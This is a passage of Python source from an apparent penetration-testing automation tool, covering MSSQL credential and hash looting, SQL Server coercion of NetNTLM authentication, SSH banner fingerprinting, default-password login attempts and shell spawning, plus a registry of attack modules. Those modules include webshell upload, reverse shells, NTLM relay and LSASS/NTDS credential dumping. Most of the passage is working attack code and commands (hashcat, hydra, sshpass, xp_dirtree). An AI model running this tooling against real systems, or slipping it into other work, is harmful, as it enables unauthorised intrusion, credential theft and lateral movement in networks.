        return (p.returncode, re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or "")))
    except (OSError, subprocess.SubprocessError):
        return (None, "")


def _tool_mssql_loot(ip: str, port: int, proto: str) -> str:
    """MSSQL step 4 tool: with a valid cred, enumerate databases, linked servers (lateral / privesc
    via EXECUTE AT), dump sql_login password hashes (→ crack), and read a file with OPENROWSET BULK
    to confirm file-read. Read-only queries via netexec mssql -q. No stored cred / no netexec →
    raises. Authorised targets only."""
    if not (shutil.which("netexec") or shutil.which("nxc")):
        raise RuntimeError("netexec (nxc) required for MSSQL loot (queries)")
    creds = _gather_mssql_creds(ip)
    if not creds:
        raise RuntimeError("no MSSQL creds — run mssql-creds (r2) first")
    user, pw = creds[0]

    def q(sql):
        return _mssql_q(ip, port, user, pw, sql)

    rc, ctx = q("SELECT SYSTEM_USER+'|'+CONVERT(varchar,IS_SRVROLEMEMBER('sysadmin'))")
    if rc is None:
        raise RuntimeError(f"{ip}:{port} — netexec mssql did not run (down / wrong port?)")
    mc = re.search(r"(\S+)\|([01])", _nxc_body(ctx))
    whoami, sysadmin = (mc.group(1), mc.group(2) == "1") if mc else (user, False)

    def toks(sql):
        body = _nxc_body(q(sql)[1])
        return [ln.strip() for ln in body.splitlines()
                if ln.strip() and ln.strip().lower() != "name" and " " not in ln.strip()]

    userdbs = [d for d in toks("SELECT name FROM sys.databases") if d not in _MSSQL_SYSDB]
    linked = toks("SELECT name FROM sys.servers WHERE server_id<>0")

    _rc, hout = q("SELECT name+'|'+CONVERT(NVARCHAR(MAX),password_hash,1) "
                  "FROM sys.sql_logins WHERE password_hash IS NOT NULL")
    hashes = re.findall(r"(\S+)\|(0x0100[0-9A-Fa-f]+)", _nxc_body(hout))

    _rc, fout = q("SELECT CAST(x.BulkColumn AS VARCHAR(300)) "
                  "FROM OPENROWSET(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) x")
    fbody = _nxc_body(fout)
    fileread = re.search(r"(?i)\[fonts\]|\[extensions\]|for 16-bit", fbody)

    lines = [f"[*] as {whoami} · sysadmin: {'yes' if sysadmin else 'no'}"]
    for login, h in hashes[:20]:
        lines.append(f"✗ HASH {login} {h[:50]}  (sys.sql_logins — crack: hashcat -m 1731)")
    for srv in linked[:15]:
        lines.append(f"✗ LINKED {srv}  (EXECUTE AT / OPENQUERY → lateral / privesc)")
    if fileread:
        snip = fbody.strip().splitlines()[0][:60] if fbody.strip() else "win.ini"
        lines.append(f"✗ FILE-READ C:\\Windows\\win.ini — {snip}")
        lines.append("· OPENROWSET BULK read works → loot web.config / connection strings / configs")
    for d in userdbs[:20]:
        lines.append(f"· DB {d}")
    if not hashes and not linked and not fileread and not userdbs:
        lines.append("· nothing enumerable with this cred — try a sysadmin login (mssql-creds r2)")
    return f"MSSQL loot — {ip}:{port}\n\n" + "\n".join(lines)


# ── MSSQL step 5: manual steps & further research (reference only, context-aware) ─
def _tool_mssql_next(ip: str, port: int, proto: str) -> str:
    """MSSQL step-5 tool: NOT a scan — a read-only checklist of where to go on MSSQL, with this
    host's own findings substituted in (confirmed RCE or a sysadmin cred to spawn, NetNTLM coercion,
    linked-server / EXECUTE AS chains, sql_login hashes to crack, phase CVEs, and unconfirmed ⚠).
    Pure DB synthesis; no network."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    banner, exe, loot = by_sid.get("mssql-banner", ""), by_sid.get("mssql-exec", ""), by_sid.get("mssql-loot", "")

    mv = re.search(r"^\[\*\] Service:\s*(.+?)(?:  ·|$)", banner, re.M)
    ver = mv.group(1).strip() if mv else ""
    creds = _gather_mssql_creds(ip)
    admins = _gather_mssql_admin(ip)
    has_rce = "✗ EXEC " in exe
    hashes = re.findall(r"^✗ HASH (\S+)", loot, re.M)
    linked = re.findall(r"^✗ LINKED (\S+)", loot, re.M)
    dbs = re.findall(r"^· DB (\S+)", loot, re.M)

    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
    reuse_svc = [n for (pnum, n) in ((445, "SMB"), (5985, "WinRM"), (22, "SSH"), (3389, "RDP"))
                 if (pnum, "tcp") in oports]
    lhost = _foothold_lhost(ip) or "<YOUR_IP>"

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            if ln.strip().startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
    warns = warns[:14]

    sub = f"{DIM}version: {ver or 'unknown'}  ·  creds: {len(creds)}  ·  sysadmin: {'yes' if admins else 'no'}  ·  RCE: {'yes' if has_rce else 'no'}"
    L = [f"MSSQL {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]

    L.append(f"\n{BOLD}A. Get a shell{RESET}")
    if has_rce or admins:
        L.append(f"  {CYAN}ready{RESET} {DIM}({'xp_cmdshell RCE' if has_rce else 'sysadmin cred'}) → "
                 f"Privilege Escalation phase → spawn-shell (r1){RESET}")
    else:
        L.append(f"  {DIM}need a sysadmin login — prove creds (r2); non-sa? escalate via B/C below{RESET}")

    L.append(f"\n{BOLD}B. Coerce the service account's NetNTLM (no sysadmin needed){RESET}")
    L.append(f"  {DIM}start Responder (smb-poison), then force MSSQL to auth to you:{RESET}")
    L.append(f"  {CYAN}EXEC master..xp_dirtree '\\\\{lhost}\\x';{RESET} {DIM} or xp_fileexist / "
             f"xp_subdirs — capture NetNTLMv2 → crack, or relay to another host (smb-relay){RESET}")

    L.append(f"\n{BOLD}C. Escalate to sysadmin{RESET}")
    if linked:
        L.append(f"  {CYAN}linked servers:{RESET} {', '.join(linked[:6])} "
                 f"{DIM}→ EXECUTE AT / OPENQUERY; often sa there (rpcout, 'sa' link creds){RESET}")
    L.append(f"  {DIM}EXECUTE AS LOGIN='sa' if impersonation is granted · TRUSTWORTHY db + db_owner → "
             f"CREATE stored proc WITH EXECUTE AS OWNER · check IS_SRVROLEMEMBER after each hop{RESET}")

    L.append(f"\n{BOLD}D. Crack & reuse{RESET}")
    if hashes:
        L.append(f"  {CYAN}{len(hashes)} sql_login hash(es){RESET} {DIM}({', '.join(hashes[:5])}) → "
                 f"hashcat -m 1731 (2012+) / -m 131 (2005){RESET}")
    tgt = ", ".join(reuse_svc) if reuse_svc else "SMB / WinRM / RDP"
    L.append(f"  {DIM}reuse the service-account / cracked creds on {tgt} (often a domain account){RESET}")
    if not hashes:
        L.append(f"  {DIM}no hashes yet — run mssql-loot (r4){RESET}")

    L.append(f"\n{BOLD}E. CVEs surfaced in this phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced — searchsploit '{ver or 'Microsoft SQL Server'}'{RESET}")

    L.append(f"\n{BOLD}F. Loot & pivot{RESET}")
    if dbs:
        L.append(f"  {CYAN}databases:{RESET} {', '.join(dbs[:8])}"
                 + (f" {DIM}+{len(dbs) - 8}{RESET}" if len(dbs) > 8 else ""))
    L.append(f"  {DIM}OPENROWSET BULK read web.config / app configs for connection strings → other DBs/hosts; "
             f"xp_cmdshell → dump creds, pivot into the domain{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}capture/crack the service hash then reuse; if you enabled xp_cmdshell, disable it "
             f"when done (sp_configure 'xp_cmdshell',0){RESET}")
    return "\n".join(L)


# ══ SSH (22 / 2222) ══ the version banner and the KEXINIT algorithm lists are exchanged in the
# clear before auth, so the fingerprint is pure stdlib; auth / shell come later (ssh CLI / netexec).
def _ssh_namelists(payload: bytes) -> list:
    """Parse the sequence of SSH name-lists out of a KEXINIT payload (after msg byte + 16B cookie)."""
    import struct
    p = payload[17:]
    out = []
    for _ in range(10):
        if len(p) < 4:
            break
        ln = struct.unpack(">I", p[:4])[0]
        out.append(p[4:4 + ln].decode("latin-1", "replace"))
        p = p[4 + ln:]
    return out


def _ssh_probe(ip: str, port: int, timeout: float = 8.0) -> dict:
    """Read the SSH banner and (best-effort) the server KEXINIT. Returns {banner, kex, hostkeys,
    ciphers} — algorithm fields empty if the KEXINIT couldn't be parsed. Raises on no banner."""
    import socket
    import struct
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        try:
            s.connect((ip, port))
        except OSError as exc:
            raise RuntimeError(f"no SSH on {ip}:{port} ({exc})")
        buf = b""
        while b"\n" not in buf and len(buf) < 2048:
            try:
                chunk = s.recv(512)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        nl = buf.find(b"\n")
        if nl < 0 or b"SSH-" not in buf:
            raise RuntimeError(f"{ip}:{port} — no SSH banner (not SSH?)")
        banner = buf[:nl].rstrip(b"\r").decode("latin-1", "replace")
        rest = buf[nl + 1:]
        try:
            s.sendall(b"SSH-2.0-pshunter\r\n")
            for _ in range(4):
                if len(rest) >= 6:
                    plen = struct.unpack(">I", rest[:4])[0]
                    if 6 <= plen <= 35000 and len(rest) >= 4 + plen:
                        break
                chunk = s.recv(4096)
                if not chunk:
                    break
                rest += chunk
        except OSError:
            pass
    finally:
        try:
            s.close()
        except Exception:                                    # noqa: BLE001
            pass

    info = {"banner": banner, "kex": "", "hostkeys": "", "ciphers": ""}
    try:
        plen = struct.unpack(">I", rest[:4])[0]
        padlen = rest[4]
        payload = rest[5:5 + plen - padlen - 1]
        if payload and payload[0] == 20:                     # SSH_MSG_KEXINIT
            names = _ssh_namelists(payload)
            if len(names) >= 4:
                info["kex"], info["hostkeys"] = names[0], names[1]
                info["ciphers"] = names[3]                    # encryption server→client
    except (struct.error, IndexError):
        pass
    return info


def _tool_ssh_banner(ip: str, port: int, proto: str) -> str:
    """SSH step 1 tool: read the cleartext banner (exact product/version) and the server KEXINIT
    (host-key / KEX / cipher algorithms) — pure stdlib, no auth. Records the service, runs
    searchsploit, and flags libssh auth-bypass (CVE-2018-10933), Terrapin prefix-truncation
    (CVE-2023-48795), OpenSSH user-enum (<7.7, CVE-2018-15473) and weak algorithms. A host that
    isn't SSH raises. Authorised targets only."""
    info = _ssh_probe(ip, port)
    banner = info["banner"]
    m = re.search(r"SSH-\d+\.\d+-([A-Za-z]+)[_-]?([\d][\w.]*)?", banner)
    product = m.group(1) if m else None
    version = m.group(2) if (m and m.group(2)) else None
    prod_map = {"OpenSSH": "OpenSSH", "dropbear": "Dropbear", "Dropbear": "Dropbear",
                "libssh": "libssh"}
    product = prod_map.get(product, product) if product else None
    if product and version:
        save_services(ip, [{"port": port, "proto": proto, "name": "ssh",
                            "product": product, "version": version}])

    lines = [f"[*] Banner: {banner}"]
    if product:
        lines.append(f"[*] Service: {product}{(' ' + version) if version else ''}")
    if info["hostkeys"]:
        lines.append(f"[*] host keys: {info['hostkeys'][:80]}")

    # libssh auth bypass (CVE-2018-10933): server-side libssh 0.6.x–0.8.3
    if product == "libssh" and version and re.match(r"0\.(6\.|7\.|8\.[0-3])", version):
        lines.append("✗ VULN libssh auth bypass — CVE-2018-10933 (send SSH2_MSG_USERAUTH_SUCCESS)")
    # OpenSSH username enumeration (< 7.7)
    if product == "OpenSSH" and version:
        vm = re.match(r"(\d+)\.(\d+)", version)
        if vm and (int(vm.group(1)), int(vm.group(2))) < (7, 7):
            lines.append("· OpenSSH < 7.7 → username enumeration (CVE-2018-15473) — see ssh-next")
    # Terrapin (CVE-2023-48795): vulnerable cipher + no strict-kex
    if info["kex"] and info["ciphers"]:
        strict = "kex-strict-s-v00@openssh.com" in info["kex"]
        vuln_cipher = ("chacha20-poly1305@openssh.com" in info["ciphers"]
                       or any(c.strip().endswith("-cbc") for c in info["ciphers"].split(",")))
        if vuln_cipher and not strict:
            lines.append("· Terrapin (CVE-2023-48795) — prefix truncation possible (no strict-kex + "
                         "chacha20/CBC-EtM); low severity, note the downgrade risk")
    if info["hostkeys"] and any(w in info["hostkeys"] for w in ("ssh-rsa", "ssh-dss")):
        lines.append("· weak host-key algo offered (ssh-rsa SHA-1 / ssh-dss)")

    ss = shutil.which("searchsploit")
    if ss and product and version:
        proc = subprocess.run([ss, "-j", "-s", "-t", product, version],
                              capture_output=True, text=True, timeout=30)
        try:
            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
        except ValueError:
            rows = []
        seen = set()
        for r in rows[:20]:
            edb = str(r.get("EDB-ID", "?"))
            if edb in seen:
                continue
            seen.add(edb)
            lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
            if len(seen) >= 8:
                break
    elif not ss and product:
        lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
    lines.append("· next: reused/known creds & recovered keys (ssh-creds r2)")
    return f"SSH banner — {ip}:{port}\n\n" + "\n".join(lines)


# ── SSH step 2: reused / known creds (targeted, lockout/fail2ban-aware) → shell ─
_SSHCREDS_DEADLINE = 120
_SSHCREDS_MAX = 40
_SSH_DEFAULTS = [
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "admin"), ("root", "raspberry"),
    ("admin", "admin"), ("user", "user"), ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("git", "git"),
    ("test", "test"), ("oracle", "oracle"), ("vagrant", "vagrant"), ("msfadmin", "msfadmin"),
    ("guest", "guest"),
]


def _ssh_auth(ip: str, port: int, user: str, pw: str) -> "bool | None":
    """True if (user, pw) logs in over SSH — netexec ssh first, sshpass+ssh fallback. None if no
    engine is available."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if nxc:
        try:
            p = subprocess.run([nxc, "ssh", ip, "--port", str(port), "-u", user, "-p", pw],
                               capture_output=True, text=True, timeout=40)
            out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
            return bool(re.search(r"\bSSH\b.*\[\+\]", out))
        except (OSError, subprocess.SubprocessError):
            return None
    sshpass, ssh = shutil.which("sshpass"), shutil.which("ssh")
    if sshpass and ssh:
        try:
            p = subprocess.run([sshpass, "-p", pw, ssh, "-p", str(port),
                                "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
                                "-o", "ConnectTimeout=6", "-o", "PreferredAuthentications=password",
                                "-o", "NumberOfPasswordPrompts=1", f"{user}@{ip}", "id"],
                               capture_output=True, text=True, timeout=20)
            return p.returncode == 0 and "uid=" in (p.stdout or "")
        except (OSError, subprocess.SubprocessError):
            return None
    return None


def _gather_ssh_creds(ip: str) -> list:
    """(user, pass) SSH logins ssh-creds proved for this host ('ssh on <ip>')."""
    out = []
    for sid, output in fetch_scripts(ip, 445, "tcp"):
        if sid != "smb-creds":
            continue
        for m in re.finditer(rf"! (\S+?):(\S*) @ ssh on {re.escape(ip)}\b", output or ""):
            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
    return out


def _tool_ssh_creds(ip: str, port: int, proto: str) -> str:
    """SSH step 2 tool: try a curated set of default SSH logins plus any harvested password (reuse
    across services — the usual SSH win) via netexec ssh (sshpass+ssh fallback) — targeted, NOT a
    wordlist brute, so it stays fail2ban-friendly. Valid logins are saved to the store ('ssh on
    <host>') for spawn-shell. No engine → raises. Authorised targets only."""
    import time
    if not (shutil.which("netexec") or shutil.which("nxc")
            or (shutil.which("sshpass") and shutil.which("ssh"))):
        raise RuntimeError("need netexec, or sshpass + ssh, to test SSH creds")

    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
    candidates, seen = [], set()
    for u, p in reused + _SSH_DEFAULTS:                       # reuse first — most likely to hit
        key = (u.lower(), p)
        if key not in seen:
            seen.add(key)
            candidates.append((u, p, (u, p) not in _SSH_DEFAULTS))
    candidates = candidates[:_SSHCREDS_MAX]

    deadline = time.time() + _SSHCREDS_DEADLINE
    valid, conn_err = [], 0
    for user, pw, is_reused in candidates:
        if time.time() > deadline:
            break
        r = _ssh_auth(ip, port, user, pw)
        if r is True:
            valid.append((user, pw, is_reused))
            break                                            # one login is enough for a shell
        elif r is None:
            conn_err += 1
            if conn_err >= 3:
                raise RuntimeError("SSH auth engine not returning results (down / wrong port?)")

    if valid:                                                # persist to the canonical creds store
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for user, pw, _r in valid:
            line = f"! {user}:{pw or '<blank>'} @ ssh on {ip} [{ip}]"
            blocks.setdefault(ip, [])
            if line not in blocks[ip]:
                blocks[ip].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(candidates)} cred(s) tried (reuse + defaults) · {len(valid)} valid"]
    for user, pw, is_reused in valid:
        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
    if valid:
        lines.append("· spawn a shell: Privilege Escalation phase → spawn-shell (r1)")
    else:
        lines.append("· no login worked — recovered a private key? ssh -i key user@host (see ssh-next)")
        lines.append(f"· full brute (mind fail2ban): hydra -L users -P rockyou.txt ssh://{ip}:{port}")
    return f"SSH credentials — {ip}:{port}\n\n" + "\n".join(lines)


def _tool_ssh_shell(ip: str, port: int, proto: str) -> str:
    """SSH foothold (INTERACTIVE): open a direct SSH session with a proven cred in a new terminal
    (sshpass for the password; SSH is natively interactive — no listener). Headless prints the
    command. Authorised targets only."""
    creds = _gather_ssh_creds(ip)
    if not creds:
        print(f"\n{YELLOW}no proven SSH cred{RESET} — run {BOLD}ssh-creds (r2){RESET} first.")
        return "ssh-shell: no SSH cred (run ssh-creds r2)"
    if not shutil.which("ssh"):
        print(f"\n{RED}✗ ssh client not installed{RESET} — install openssh-client.")
        return "ssh-shell: no ssh client"
    if len(creds) == 1:
        user, pw = creds[0]
    else:
        print(f"\n{BOLD}SSH creds{RESET}")
        for i, (u, _p) in enumerate(creds, 1):
            print(f"  {BOLD}{i}{RESET}  {u}")
        v = _ask("pick cred [1-N, blank = 1]:")
        user, pw = creds[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(creds)) else creds[0]

    opts = ("-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            f"-p {port} {shlex.quote(user)}@{ip}")
    if pw and shutil.which("sshpass"):
        cmd = f"sshpass -p {shlex.quote(pw)} ssh {opts}"
    else:
        cmd = f"ssh {opts}"                                   # will prompt for the password/key
    term = _open_shell_terminal(cmd)
    if not term:
        print(f"{YELLOW}headless{RESET} — run:\n  {BOLD}{cmd}{RESET}")
        return f"ssh-shell: headless — command shown ({user}@{ip})"
    print(f"{GREEN}▶ SSH session opened in a new {term} window{RESET} {DIM}→ {user}@{ip}:{port}{RESET}")
    return f"ssh-shell: shell → {user}@{ip}:{port}"


# ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
# service surfaced. A router: it detects which of this host's services have a viable path to a
# shell (from findings already in the DB) and dispatches to that service's existing foothold tool
# (each keeps its own method sub-picker). No re-implementation — pure aggregation.
def _spawn_shell_paths(ip: str) -> list:
    """Viable foothold paths for this host, derived from earlier findings.
    Returns [(service_label, detail, tool_key, port, proto)]."""
    paths = []
    targets = _exploit_targets(ip)
    by_key = {}
    for port, proto, _label, key, _ver, _sig in targets:
        by_key.setdefault(key, []).append((port, proto))

    if by_key.get("smb") and any(h == ip for h, _u, _s in _gather_smb_admin()):
        p, pr = by_key["smb"][0]
        paths.append(("SMB", "admin session — psexec / wmiexec / smbexec / evil-winrm",
                      "smb-foothold", p, pr))
    if by_key.get("winrm") and any(h == ip for h, _u, _s in _gather_winrm_creds()):
        p, pr = by_key["winrm"][0]
        paths.append(("WinRM", "evil-winrm shell (a spray-proven cred)", "winrm-shell", p, pr))
    for p, pr in by_key.get("ftp", []):
        methods = _ftp_foothold_methods(ip, p)
        if methods:
            paths.append(("FTP", " / ".join(k for k, _l in methods), "ftp-foothold", p, pr))
    for p, pr in by_key.get("http", []):
        if _parse_cmdi_vectors(ip, p, pr):
            paths.append(("HTTP", "reverse shell over a confirmed cmdi RCE channel",
                          "foothold", p, pr))
    for p, pr in by_key.get("telnet", []):
        banner = next((o for s, o in fetch_scripts(ip, p, pr) if s == "telnet-banner"), "")
        noauth = "✗ NOAUTH" in banner
        creds = _gather_telnet_creds(ip)
        if noauth or creds:
            detail = ("auto-login (proven cred)" if creds else "unauthenticated shell (no creds)")
            paths.append(("Telnet", detail, "telnet-shell", p, pr))
    for p, pr in by_key.get("mysql", []):
        rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "mysql-rce"), "")
        if "✗ RCE " in rce:
            paths.append(("MySQL", "reverse shell via the INTO OUTFILE webshell", "mysql-shell", p, pr))
    for p, pr in by_key.get("mssql", []):
        if _gather_mssql_admin(ip):
            paths.append(("MSSQL", "xp_cmdshell → PowerShell reverse shell (sysadmin)", "mssql-shell", p, pr))
    for p, pr in by_key.get("ssh", []):
        if _gather_ssh_creds(ip):
            paths.append(("SSH", "direct interactive session (proven cred)", "ssh-shell", p, pr))
    return paths


def _tool_spawn_shell(ip: str, port: int, proto: str) -> str:
    """Privesc step 1 tool (INTERACTIVE): the single place to spawn a shell. Aggregates every
    viable foothold path this host's exploited services surfaced (SMB admin, WinRM, FTP, HTTP RCE),
    lets the operator pick one, and hands off to that service's existing foothold tool (which then
    picks the exact method). The chosen result is stored under the originating service so it shows
    up in that host's findings exactly as before. Authorised targets only."""
    paths = _spawn_shell_paths(ip)
    if not paths:
        print(f"\n{YELLOW}no viable foothold path yet{RESET} — unlock one first:\n"
              f"  {DIM}· SMB   → smb-spray / smb-exec (confirm a local admin)\n"
              f"  · WinRM → winrm-spray (a cred that gets a shell)\n"
              f"  · FTP   → ftp-banner / ftp-webshell / ftp-write (+SSH)\n"
              f"  · HTTP  → cmdi-scan (a confirmed command channel){RESET}")
        return "spawn-shell: no viable path yet"

    if len(paths) == 1:
        label, detail, tool_key, p, pr = paths[0]
        print(f"\n{DIM}one path available:{RESET} {BOLD}{label}{RESET} {DIM}{detail}{RESET}")
    else:
        print(f"\n{BOLD}spawn a shell — pick a path{RESET}")
        for i, (label, detail, _tk, p, pr) in enumerate(paths, 1):
            print(f"  {BOLD}{i}{RESET}  {CYAN}{label:<6}{RESET}{DIM}:{pr}/{p}{RESET}  {detail}")
        v = _ask("pick path [1-N, blank = cancel]:")
        if not v or not v.isdigit() or not 1 <= int(v) <= len(paths):
            print(f"{DIM}cancelled{RESET}")
            return "spawn-shell: cancelled"
        label, detail, tool_key, p, pr = paths[int(v) - 1]

    res = _STEP_TOOLS[tool_key][1](ip, p, pr)               # hand off to the service's foothold tool
    if "shell → " in res:                                   # a shell was actually spawned
        save_scripts(ip, [{"id": tool_key, "port": p, "proto": pr, "output": res}])
    return f"spawn-shell: {label} → {res}"


# tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
_STEP_TOOLS = {
    "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
    "http-fingerprint": ("whatweb (stack fingerprint)", _tool_http_fingerprint),
    "ssl-cert": ("openssl (TLS cert → hostnames/emails)", _tool_tls_cert),
    "searchsploit": ("searchsploit (Exploit-DB by version)", _tool_searchsploit),
    "http-source": ("view-source + JS mining (endpoints/secrets)", _tool_http_source),
    "http-wellknown": ("robots/sitemap/.well-known + error page", _tool_http_wellknown),
    "http-cookies": ("cookie flags + JWT (alg:none / weak secret)", _tool_http_cookies),
    "vhost-fuzz": ("vhost sweep (stdlib) → hidden apps on this IP", _tool_vhost_fuzz),
    "dir-brute": ("content sweep (stdlib) → dirs/files per host+vhost", _tool_dir_brute),
    "vcs-hunt": ("VCS/backup/config hunt (stdlib, signature-checked)", _tool_vcs_hunt),
    "param-hunt": ("hidden param discovery (stdlib) → dynamic endpoints", _tool_param_hunt),
    "default-creds": ("default creds check (stdlib) → Basic + login forms", _tool_default_creds),
    "auth-bypass": ("auth bypass (SQLi) + user enumeration (stdlib)", _tool_auth_bypass),
    "login-brute": ("targeted login brute (stdlib, gated) → Basic + forms", _tool_login_brute),
    "sqli-scan": ("SQLi scan (stdlib: error/boolean/time) + sqlmap enum/dump", _tool_sqli_scan),
    "sqli-dump": ("SQLi auto-dump (OSCP-safe, no sqlmap) → UNION/error/blind", _tool_sqli_dump),
    "lfi-scan": ("LFI / path traversal (stdlib, content-verified) → php://filter, /proc", _tool_lfi_scan),
    "rfi-scan": ("RFI / wrapper inclusion (stdlib) → data://, php://input", _tool_rfi_scan),
    "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
    "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
    "upload-shell": ("file-upload webshell (stdlib, PHP/ASP/JSP auto, exec-verified)", _tool_file_upload),
    "xxe-ssrf": ("XXE & SSRF (stdlib, read-only) → metadata + file-read + OOB", _tool_xxe_ssrf),
    "idor-bac": ("IDOR / broken access control (stdlib, read-only, creds-aware)", _tool_idor_bac),
    "cms-scan": ("CMS scan → wpscan/droopescan + stdlib fallback (plugins/themes/users)", _tool_cms_scan),
    "admin-rce": ("admin panel → RCE (WordPress, creds-gated, inert, reversible)", _tool_admin_rce),
    "foothold": ("foothold → spawn & auto-upgrade a reverse shell (interactive)", _tool_foothold),
    "next-steps": ("manual steps (context-aware, reference only)", _tool_next_steps),
    "smb-enum": ("SMB null/guest enum (netexec → shares/users/pol + OS/domain/signing)", _tool_smb_enum),
    "smb-vuln": ("SMB version-RCE scan (nmap NSE + netexec, detection only)", _tool_smb_vuln),
    "smb-loot": ("SMB share loot (smbclient, read-only, in-memory grep → creds/secrets)", _tool_smb_loot),
    "smb-gpp": ("SYSVOL/NETLOGON GPP loot (netexec + smbclient, creds-aware, DC)", _tool_smb_gpp),
    "smb-poison": ("LLMNR/NBT-NS poisoning → NetNTLM capture (Responder, timed, root)", _tool_smb_poison),
    "smb-relay": ("NTLM relay → SAM dump (ntlmrelayx, signing-off targets, timed, root)", _tool_smb_relay),
    "smb-coerce": ("Auth coercion (netexec coerce_plus → drives relay/poison)", _tool_smb_coerce),
    "smb-dccve": ("DC-takeover CVE scan (ZeroLogon/noPac/PrintNightmare, detection only)", _tool_smb_dccve),
    "smb-spray": ("Credential spray across hosts (netexec, reuse/lateral → admin)", _tool_smb_spray),
    "smb-exec": ("Confirm command exec over admin creds (netexec -x → feeds foothold)", _tool_smb_exec),
    "smb-dump": ("Dump SAM/LSA/LSASS/DPAPI + DCSync NTDS (netexec, admin creds)", _tool_smb_dump),
    "smb-writable": ("Writable share → plant hash-capture LNK (netexec slinky, reversible)", _tool_smb_writable),
    "smb-foothold": ("foothold → spawn interactive admin session (psexec/evil-winrm)", _tool_smb_foothold),
    "smb-next": ("manual AD/SMB steps (context-aware, reference only)", _tool_smb_next),
    "winrm-enum": ("Confirm WinRM transport + auth (stdlib /wsman probe + netexec)", _tool_winrm_enum),
    "winrm-spray": ("Validate harvested creds/hashes against WinRM (netexec → shell)", _tool_winrm_spray),
    "winrm-shell": ("Interactive WinRM shell (evil-winrm, -S HTTPS, PtH)", _tool_winrm_shell),
    "winrm-access": ("Who can WinRM — Remote Management Users / admins (netexec)", _tool_winrm_access),
    "winrm-recon": ("Post-access recon over WinRM (privesc path + pivot surface)", _tool_winrm_recon),
    "winrm-next": ("manual WinRM/AD steps (context-aware, reference only)", _tool_winrm_next),
    "ftp-banner": ("FTP banner + version → searchsploit (stdlib ftplib)", _tool_ftp_banner),
    "ftp-anon": ("Anonymous login → browse tree (stdlib ftplib, read-only)", _tool_ftp_anon),
    "ftp-write": ("Test write access → throwaway upload (stdlib, reversible)", _tool_ftp_write),
    "ftp-creds": ("Default + reused FTP creds (stdlib, targeted, lockout-safe)", _tool_ftp_creds),
    "ftp-webshell": ("FTP-writable + web root → webshell RCE (stdlib, exec-verified)", _tool_ftp_webshell),
    "ftp-bounce": ("FTP-bounce (PORT) → scan internal 127.0.0.1 ports (stdlib)", _tool_ftp_bounce),
    "ftp-foothold": ("foothold → backdoor / web-RCE / ssh-key (interactive, pick)", _tool_ftp_foothold),
    "ftp-next": ("manual FTP steps (context-aware, reference only)", _tool_ftp_next),
    "tftp-probe": ("confirm UDP/69 + path-traversal read (raw UDP, content-verified)", _tool_tftp_probe),
    "tftp-grab": ("sweep known filenames → configs/creds/secrets (raw UDP, in-memory grep)", _tool_tftp_grab),
    "tftp-write": ("test anonymous write (WRQ throwaway) — non-reversible, no DELETE", _tool_tftp_write),
    "tftp-next": ("manual TFTP steps (context-aware, reference only)", _tool_tftp_next),
    "telnet-banner": ("telnet banner + version → searchsploit; probe no-auth shell (raw socket)", _tool_telnet_banner),
    "telnet-creds": ("default + reused telnet creds (raw socket, probe-verified, lockout-safe)", _tool_telnet_creds),
    "telnet-shell": ("telnet foothold → auto-login interactive session (spawned)", _tool_telnet_shell),
    "telnet-sniff": ("passive cleartext-cred sniff on TCP/23 (raw socket, root, timed)", _tool_telnet_sniff),
    "telnet-next": ("manual telnet steps (context-aware, reference only)", _tool_telnet_next),
    "mysql-banner": ("MySQL/MariaDB handshake → version + auth plugin → searchsploit (stdlib)", _tool_mysql_banner),
    "mysql-creds": ("root no-pass + default/reused creds; CVE-2012-2122 bypass (mysql CLI / netexec)", _tool_mysql_creds),
